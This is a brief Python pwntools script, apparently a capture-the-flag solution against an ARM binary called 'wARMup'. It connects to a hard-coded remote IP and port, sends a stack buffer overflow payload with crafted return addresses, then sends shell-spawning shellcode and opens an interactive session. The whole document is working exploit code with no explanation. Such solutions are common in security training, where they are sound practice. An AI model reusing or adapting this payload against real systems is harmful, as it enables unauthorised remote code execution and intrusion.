from pwn import*

#p=process(['qemu-arm','-g','1280','-L','./','./wARMup'])
#pause()
p=remote("13.124.80.124",'6667')
context.arch='arm'

print(p.recv(1024))
payload="a"*100+p32(0xf6ffe010)
payload+=p32(0x10364)+p32(0xf6ffe010)+p32(0x10534)+"a"*3
p.send(payload+"\n")
payload2=p32(0xf6ffe014)+asm(shellcraft.sh())
p.send(payload2+"\n")
p.interactive()

